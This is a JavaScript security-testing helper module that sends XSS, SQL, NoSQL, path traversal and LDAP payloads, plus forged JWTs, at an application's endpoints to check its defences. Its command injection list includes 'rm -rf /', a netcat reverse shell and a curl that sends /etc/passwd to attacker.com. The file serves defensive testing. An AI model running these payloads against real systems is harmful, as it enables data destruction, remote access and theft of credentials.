/**
 * Security testing utilities for comprehensive security validation
 * Provides helpers for testing OWASP Top 10 vulnerabilities
 */

import request from 'supertest';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

/**
 * XSS attack payloads for testing
 */
export const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<input onfocus=alert("XSS") autofocus>',
  '<body onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "'><script>alert('XSS')</script>",
  '<script>document.cookie="xss=true"</script>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
  '<style>@import "javascript:alert(\'XSS\')";</style>',
  '<object data="javascript:alert(\'XSS\')"></object>',
  '<embed src="javascript:alert(\'XSS\')"></embed>'
];

/**
 * SQL injection payloads for testing
 */
export const sqlInjectionPayloads = [
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "admin'--",
  "1; DELETE FROM users WHERE 1=1; --",
  "' UNION SELECT * FROM users --",
  "'; SHUTDOWN; --",
  "' OR 1=1 --",
  "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
  "' OR 'a'='a",
  "1' UNION SELECT password FROM users WHERE username='admin'--",
  "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
  "' AND (SELECT COUNT(*) FROM users) > 0 --"
];

/**
 * NoSQL injection payloads for testing
 */
export const noSqlInjectionPayloads = [
  { $ne: null },
  { $gt: '' },
  { $regex: '.*' },
  { $where: 'this.username == this.password' },
  { $or: [{ username: 'admin' }, { password: 'admin' }] },
  { username: { $ne: null }, password: { $ne: null } },
  { $and: [{ username: { $exists: true } }, { password: { $exists: true } }] },
  { username: { $in: ['admin', 'administrator', 'root'] } }
];

/**
 * Path traversal payloads for testing
 */
export const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '../etc/hosts',
  '../../../../../../../../etc/passwd',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '..%252F..%252F..%252Fetc%252Fpasswd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
];

/**
 * Command injection payloads for testing
 */
export const commandInjectionPayloads = [
  '; cat /etc/passwd',
  '| whoami',
  '`id`',
  '$(cat /etc/passwd)',
  '; rm -rf /',
  '&& cat /etc/passwd',
  '|| id',
  '; nc -e /bin/sh attacker.com 4444',
  '`curl http://attacker.com/steal?data=$(cat /etc/passwd)`'
];

/**
 * LDAP injection payloads for testing
 */
export const ldapInjectionPayloads = [
  '*',
  '*)(&',
  '*)(uid=*',
  '*)(cn=*)',
  '*)(&(objectClass=*',
  '*)(|(objectClass=*))',
  '*))%00',
  '*)(&(password=*))',
  '*)(mail=*)'
];

/**
 * Test XSS protection
 */
export const testXSSProtection = async (app, endpoint, field, expectedStatus = 400) => {
  const results = [];
  
  for (const payload of xssPayloads) {
    const testData = { [field]: payload };
    
    try {
      const response = await request(app)
        .post(endpoint)
        .send(testData);
      
      results.push({
        payload,
        status: response.status,
        blocked: response.status === expectedStatus,
        body: response.body
      });
    } catch (error) {
      results.push({
        payload,
        status: 'error',
        blocked: true,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test SQL injection protection
 */
export const testSQLInjectionProtection = async (app, endpoint, field, expectedStatus = 400) => {
  const results = [];
  
  for (const payload of sqlInjectionPayloads) {
    const testData = { [field]: payload };
    
    try {
      const response = await request(app)
        .post(endpoint)
        .send(testData);
      
      results.push({
        payload,
        status: response.status,
        blocked: response.status === expectedStatus,
        body: response.body
      });
    } catch (error) {
      results.push({
        payload,
        status: 'error',
        blocked: true,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test NoSQL injection protection
 */
export const testNoSQLInjectionProtection = async (app, endpoint, expectedStatus = 400) => {
  const results = [];
  
  for (const payload of noSqlInjectionPayloads) {
    try {
      const response = await request(app)
        .post(endpoint)
        .send(payload);
      
      results.push({
        payload: JSON.stringify(payload),
        status: response.status,
        blocked: response.status === expectedStatus,
        body: response.body
      });
    } catch (error) {
      results.push({
        payload: JSON.stringify(payload),
        status: 'error',
        blocked: true,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test path traversal protection
 */
export const testPathTraversalProtection = async (app, endpoint, field, expectedStatus = 400) => {
  const results = [];
  
  for (const payload of pathTraversalPayloads) {
    const testData = { [field]: payload };
    
    try {
      const response = await request(app)
        .post(endpoint)
        .send(testData);
      
      results.push({
        payload,
        status: response.status,
        blocked: response.status === expectedStatus,
        body: response.body
      });
    } catch (error) {
      results.push({
        payload,
        status: 'error',
        blocked: true,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test rate limiting
 */
export const testRateLimiting = async (app, endpoint, options = {}) => {
  const {
    method = 'post',
    data = {},
    attempts = 20,
    expectedLimitStatus = 429
  } = options;
  
  const results = [];
  
  for (let i = 0; i < attempts; i++) {
    try {
      const response = await request(app)[method](endpoint).send(data);
      
      results.push({
        attempt: i + 1,
        status: response.status,
        rateLimited: response.status === expectedLimitStatus,
        body: response.body
      });
      
      // Short delay between requests
      await new Promise(resolve => setTimeout(resolve, 10));
    } catch (error) {
      results.push({
        attempt: i + 1,
        status: 'error',
        rateLimited: true,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test JWT security
 */
export const testJWTSecurity = {
  /**
   * Generate invalid JWT tokens for testing
   */
  generateInvalidTokens: () => {
    const validPayload = { userId: '123', email: 'test@example.com' };
    const validSecret = 'test-secret';
    
    return {
      expired: jwt.sign(validPayload, validSecret, { expiresIn: '-1h' }),
      invalidSignature: jwt.sign(validPayload, 'wrong-secret'),
      malformed: 'invalid.jwt.token',
      empty: '',
      noSignature: Buffer.from(JSON.stringify(validPayload)).toString('base64'),
      invalidAlgorithm: jwt.sign(validPayload, validSecret, { algorithm: 'none' }),
      tampered: jwt.sign(validPayload, validSecret).slice(0, -10) + 'tampered123'
    };
  },
  
  /**
   * Test JWT endpoint with invalid tokens
   */
  testInvalidTokens: async (app, endpoint, tokens) => {
    const results = [];
    
    for (const [type, token] of Object.entries(tokens)) {
      try {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${token}`);
        
        results.push({
          type,
          token: token.substring(0, 20) + '...',
          status: response.status,
          rejected: response.status === 401,
          body: response.body
        });
      } catch (error) {
        results.push({
          type,
          token: token.substring(0, 20) + '...',
          status: 'error',
          rejected: true,
          error: error.message
        });
      }
    }
    
    return results;
  }
};

/**
 * Test CORS security
 */
export const testCORSSecurity = async (app, endpoint, origins) => {
  const results = [];
  
  for (const origin of origins) {
    try {
      const response = await request(app)
        .options(endpoint)
        .set('Origin', origin)
        .set('Access-Control-Request-Method', 'POST');
      
      results.push({
        origin,
        status: response.status,
        allowed: response.headers['access-control-allow-origin'] === origin,
        headers: response.headers
      });
    } catch (error) {
      results.push({
        origin,
        status: 'error',
        allowed: false,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test file upload security
 */
export const testFileUploadSecurity = async (app, endpoint, files) => {
  const results = [];
  
  for (const file of files) {
    try {
      const response = await request(app)
        .post(endpoint)
        .attach('file', Buffer.from(file.content), file.name);
      
      results.push({
        filename: file.name,
        mimetype: file.mimetype,
        status: response.status,
        blocked: response.status >= 400,
        body: response.body
      });
    } catch (error) {
      results.push({
        filename: file.name,
        mimetype: file.mimetype,
        status: 'error',
        blocked: true,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test input validation
 */
export const testInputValidation = async (app, endpoint, testCases) => {
  const results = [];
  
  for (const testCase of testCases) {
    try {
      const response = await request(app)
        .post(endpoint)
        .send(testCase.data);
      
      results.push({
        description: testCase.description,
        data: testCase.data,
        status: response.status,
        valid: response.status < 400,
        expectedValid: testCase.expectedValid,
        passed: (response.status < 400) === testCase.expectedValid,
        body: response.body
      });
    } catch (error) {
      results.push({
        description: testCase.description,
        data: testCase.data,
        status: 'error',
        valid: false,
        expectedValid: testCase.expectedValid,
        passed: !testCase.expectedValid,
        error: error.message
      });
    }
  }
  
  return results;
};

/**
 * Test session security
 */
export const testSessionSecurity = {
  /**
   * Test session fixation
   */
  testSessionFixation: async (app, loginEndpoint, protectedEndpoint) => {
    // Get initial session
    const initialResponse = await request(app).get('/');
    const initialCookie = initialResponse.headers['set-cookie'];
    
    // Login with existing session
    const loginResponse = await request(app)
      .post(loginEndpoint)
      .set('Cookie', initialCookie)
      .send({ email: 'test@example.com', password: 'password' });
    
    const loginCookie = loginResponse.headers['set-cookie'];
    
    // Check if session ID changed after login
    return {
      sessionChanged: JSON.stringify(initialCookie) !== JSON.stringify(loginCookie),
      initialCookie,
      loginCookie
    };
  },
  
  /**
   * Test session timeout
   */
  testSessionTimeout: async (app, protectedEndpoint, timeoutMs = 1000) => {
    const agent = request.agent(app);
    
    // Login
    await agent
      .post('/api/auth/login')
      .send({ email: 'test@example.com', password: 'password' });
    
    // Wait for timeout
    await new Promise(resolve => setTimeout(resolve, timeoutMs));
    
    // Try to access protected resource
    const response = await agent.get(protectedEndpoint);
    
    return {
      timedOut: response.status === 401,
      status: response.status,
      body: response.body
    };
  }
};

/**
 * Test HTTP headers security
 */
export const testSecurityHeaders = async (app, endpoint) => {
  const response = await request(app).get(endpoint);
  
  const securityHeaders = {
    'x-content-type-options': response.headers['x-content-type-options'],
    'x-frame-options': response.headers['x-frame-options'],
    'x-xss-protection': response.headers['x-xss-protection'],
    'strict-transport-security': response.headers['strict-transport-security'],
    'content-security-policy': response.headers['content-security-policy'],
    'referrer-policy': response.headers['referrer-policy']
  };
  
  const recommendations = {
    'x-content-type-options': securityHeaders['x-content-type-options'] === 'nosniff',
    'x-frame-options': ['DENY', 'SAMEORIGIN'].includes(securityHeaders['x-frame-options']),
    'x-xss-protection': securityHeaders['x-xss-protection'] === '1; mode=block',
    'strict-transport-security': !!securityHeaders['strict-transport-security'],
    'content-security-policy': !!securityHeaders['content-security-policy'],
    'referrer-policy': !!securityHeaders['referrer-policy']
  };
  
  return {
    headers: securityHeaders,
    recommendations,
    score: Object.values(recommendations).filter(Boolean).length
  };
};

/**
 * Generate comprehensive security report
 */
export const generateSecurityReport = (testResults) => {
  const report = {
    timestamp: new Date().toISOString(),
    summary: {
      totalTests: 0,
      passed: 0,
      failed: 0,
      score: 0
    },
    details: testResults,
    recommendations: []
  };
  
  // Calculate summary
  Object.values(testResults).forEach(category => {
    if (Array.isArray(category)) {
      report.summary.totalTests += category.length;
      report.summary.passed += category.filter(test => test.passed || test.blocked).length;
    }
  });
  
  report.summary.failed = report.summary.totalTests - report.summary.passed;
  report.summary.score = Math.round((report.summary.passed / report.summary.totalTests) * 100);
  
  // Generate recommendations
  if (report.summary.score < 100) {
    report.recommendations.push('Review failed security tests and implement necessary fixes');
  }
  if (report.summary.score < 80) {
    report.recommendations.push('Consider implementing additional security measures');
  }
  if (report.summary.score < 60) {
    report.recommendations.push('Critical security vulnerabilities detected - immediate action required');
  }
  
  return report;
};

export default {
  xssPayloads,
  sqlInjectionPayloads,
  noSqlInjectionPayloads,
  pathTraversalPayloads,
  commandInjectionPayloads,
  ldapInjectionPayloads,
  testXSSProtection,
  testSQLInjectionProtection,
  testNoSQLInjectionProtection,
  testPathTraversalProtection,
  testRateLimiting,
  testJWTSecurity,
  testCORSSecurity,
  testFileUploadSecurity,
  testInputValidation,
  testSessionSecurity,
  testSecurityHeaders,
  generateSecurityReport
};